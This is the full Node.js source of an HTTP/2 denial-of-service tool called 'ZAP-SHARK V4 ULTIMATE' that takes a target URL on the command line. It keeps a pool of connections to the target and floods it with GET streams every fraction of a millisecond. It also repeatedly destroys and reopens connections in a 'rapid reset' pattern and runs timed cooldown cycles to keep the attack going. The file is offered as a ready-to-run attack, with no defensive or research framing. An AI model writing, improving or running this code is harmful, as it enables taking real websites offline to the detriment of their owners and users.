const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK_V4_ULTIMATE {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // CONNECTION SYSTEM
        this.connectionPool = [];
        this.connCount = 12;
        this.maxStreamsPerConn = 1000;
        
        // RAPID RESET
        this.lastConnectionReset = Date.now();
        this.resetInterval = 900;
        
        // PAYLOAD SYSTEM (1-5M REQS)
        this.payloadCounter = 0;
        this.payloadThreshold = 1000000 + Math.random() * 4000000; // 1-5M random
        this.payloadActive = false;
        
        // STABILITY
        this.lastMemoryFlush = Date.now();
        this.badConnectionsDropped = 0;
        
        // MAINTENANCE
        this.lastMaintenance = Date.now();
        this.maintenanceActive = false;
        
        // INTERVALS
        this.attackInterval = null;
        this.mainLoop = null;
    }

    // === CONNECTION SYSTEM ===
    createConnection() {
        try {
            const client = http2.connect(this.targetUrl, {
                maxSessionMemory: 65536
            });
            
            client.setMaxListeners(1000);
            client.on('error', () => {});
            
            return { client, created: Date.now(), requests: 0 };
        } catch (err) {
            return null;
        }
    }

    buildConnectionPool() {
        this.connectionPool = [];
        for (let i = 0; i < this.connCount; i++) {
            const conn = this.createConnection();
            if (conn) {
                this.connectionPool.push(conn);
            }
        }
    }

    // === RAPID RESET ===
    performRapidReset() {
        const now = Date.now();
        if (now - this.lastConnectionReset >= this.resetInterval) {
            const resetCount = Math.ceil(this.connectionPool.length * 0.3);
            
            for (let i = 0; i < resetCount; i++) {
                const index = Math.floor(Math.random() * this.connectionPool.length);
                if (this.connectionPool[index]) {
                    try {
                        this.connectionPool[index].client.destroy();
                        this.badConnectionsDropped++;
                        
                        const newConn = this.createConnection();
                        if (newConn) {
                            this.connectionPool[index] = newConn;
                        }
                    } catch (err) {}
                }
            }
            
            this.lastConnectionReset = now;
        }
    }

    // === PAYLOAD SYSTEM ===
    shouldSendPayload() {
        this.payloadCounter++;
        
        if (this.payloadCounter >= this.payloadThreshold) {
            this.payloadCounter = 0;
            this.payloadThreshold = 1000000 + Math.random() * 4000000;
            return true;
        }
        return false;
    }

    // === ATTACK SYSTEM ===
    sendRequest() {
        if (this.maintenanceActive || this.connectionPool.length === 0) return;
        
        // CHECK FOR PAYLOAD
        const sendPayload = this.shouldSendPayload();
        
        const maxStreams = this.maxStreamsPerConn * this.connectionPool.length;
        const availableStreams = Math.min(maxStreams, 100);
        
        for (let i = 0; i < availableStreams; i++) {
            const conn = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
            if (!conn) continue;

            try {
                const headers = {
                    ':method': 'GET',
                    ':path': '/',
                    ':authority': this.hostname
                };
                
                // ADD PAYLOAD IF IT'S TIME
                if (sendPayload) {
                    headers['x-payload'] = 'T.Ø.Š-$HĀRKWIRE-TØR';
                    headers['content-length'] = '0';
                }
                
                const req = conn.client.request(headers);
                conn.requests++;
                
                req.on('response', () => {
                    req.destroy();
                });
                
                req.on('error', (err) => {
                    req.destroy();
                });
                
                req.on('close', () => {
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                });
                
                req.end();
                
            } catch (err) {
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
    }

    // === STABILITY ===
    flushMemory() {
        const now = Date.now();
        if (now - this.lastMemoryFlush >= 8000) { // 8s
            try {
                // DROP BAD CONNECTIONS
                this.connectionPool = this.connectionPool.filter(conn => {
                    try {
                        if (conn.requests === 0 && (now - conn.created) > 10000) {
                            conn.client.destroy();
                            this.badConnectionsDropped++;
                            return false;
                        }
                        return true;
                    } catch (err) {
                        return false;
                    }
                });
                
                // REFILL POOL IF NEEDED
                while (this.connectionPool.length < this.connCount) {
                    const newConn = this.createConnection();
                    if (newConn) {
                        this.connectionPool.push(newConn);
                    }
                }
                
                this.lastMemoryFlush = now;
            } catch (err) {}
        }
    }

    throttleCPU() {
        // SIMPLE THROTTLE - ADJUST RESET INTERVAL
        const usage = process.cpuUsage();
        const cpuPercent = (usage.user + usage.system) / 1000000;
        
        if (cpuPercent > 89) {
            this.resetInterval = Math.min(2000, this.resetInterval + 100);
        } else if (cpuPercent < 60) {
            this.resetInterval = Math.max(500, this.resetInterval - 50);
        }
    }

    // === MAINTENANCE ===
    checkMaintenance() {
        const now = Date.now();
        
        if (!this.maintenanceActive && now - this.lastMaintenance >= 1200000) { // 20 mins
            this.startMaintenance();
        }
        
        if (this.maintenanceActive && now - this.lastMaintenance >= 2400000) { // 40 mins total
            this.endMaintenance();
        }
    }

    startMaintenance() {
        console.log('\n[!] MAINTENANCE - COOLING 20 MINUTES [!]');
        this.status = "COOLING";
        this.maintenanceActive = true;
        this.lastMaintenance = Date.now();
        
        // STOP ATTACKS
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
            this.attackInterval = null;
        }
        
        // START BACKGROUND FLUSH
        this.startBackgroundFlush();
    }

    startBackgroundFlush() {
        if (!this.maintenanceActive) return;
        
        console.log('[~] Background flush started');
        
        const flushInterval = setInterval(() => {
            if (!this.maintenanceActive) {
                clearInterval(flushInterval);
                return;
            }
            
            // FLUSH EVERY 1 MINUTE
            exec('ipconfig /flushdns >nul 2>&1 || echo ""', () => {});
            
        }, 60000);
    }

    endMaintenance() {
        console.log('\n[+] MAINTENANCE COMPLETE - RESUMING [+]');
        this.status = "ATTACKING";
        this.maintenanceActive = false;
        this.lastMaintenance = Date.now();
        
        // REBUILD CONNECTIONS
        this.buildConnectionPool();
        
        // RESTART ATTACK
        setTimeout(() => {
            this.startAttackLoop();
        }, 2000);
    }

    // === DISPLAY ===
    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    updateDisplay() {
        this.calculateRPS();
        
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const hours = Math.floor(runtime / 3600);
        const minutes = Math.floor((runtime % 3600) / 60);
        const seconds = runtime % 60;
        const runtimeStr = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        const maintenanceTime = this.maintenanceActive ? 
            `${Math.floor((2400000 - (Date.now() - this.lastMaintenance)) / 60000)}m` :
            `${Math.floor((1200000 - (Date.now() - this.lastMaintenance)) / 60000)}m`;
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`=== ZAP-SHARK V4 ULTIMATE ===`);
        console.log(`RUNTIME: ${runtimeStr} | STATUS: ${this.status}`);
        console.log('='.repeat(50));
        console.log(`TOTAL REQUESTS: ${this.totalRequests.toLocaleString()}`);
        console.log(`CURRENT RPS: ${this.currentRPS.toFixed(1)}`);
        console.log(`CONNECTIONS: ${this.connectionPool.length} | BAD DROPPED: ${this.badConnectionsDropped}`);
        console.log(`NEXT PAYLOAD: ${(this.payloadThreshold - this.payloadCounter).toLocaleString()}`);
        console.log('='.repeat(50));
        console.log(`NEXT MAINTENANCE: ${maintenanceTime}`);
        console.log('='.repeat(50));
    }

    // === MAIN ===
    startAttackLoop() {
        if (this.attackInterval) clearInterval(this.attackInterval);
        
        this.attackInterval = setInterval(() => {
            if (!this.maintenanceActive) {
                // SEND MULTIPLE BATCHES
                for (let i = 0; i < 3; i++) {
                    this.sendRequest();
                }
            }
        }, 0.1);
    }

    start() {
        console.log('=== ZAP-SHARK V4 ULTIMATE ===');
        console.log('Target:', this.targetUrl);
        console.log('='.repeat(50));
        
        this.buildConnectionPool();
        
        setTimeout(() => {
            // MAIN LOOP
            this.mainLoop = setInterval(() => {
                this.performRapidReset();
                this.flushMemory();
                this.throttleCPU();
                this.checkMaintenance();
                this.updateDisplay();
            }, 100);
            
            // ATTACK LOOP
            this.startAttackLoop();
            
        }, 2000);
        
        process.on('SIGINT', () => {
            console.log('\n\n=== FINAL STATS ===');
            console.log(`Total Requests: ${this.totalRequests.toLocaleString()}`);
            console.log(`Bad Connections Dropped: ${this.badConnectionsDropped}`);
            console.log('='.repeat(40));
            
            this.running = false;
            clearInterval(this.mainLoop);
            clearInterval(this.attackInterval);
            
            this.connectionPool.forEach(conn => {
                try { conn.client.destroy(); } catch (err) {}
            });
            
            process.exit(0);
        });
    }
}

// USAGE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node shark.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK_V4_ULTIMATE(target);
shark.start();
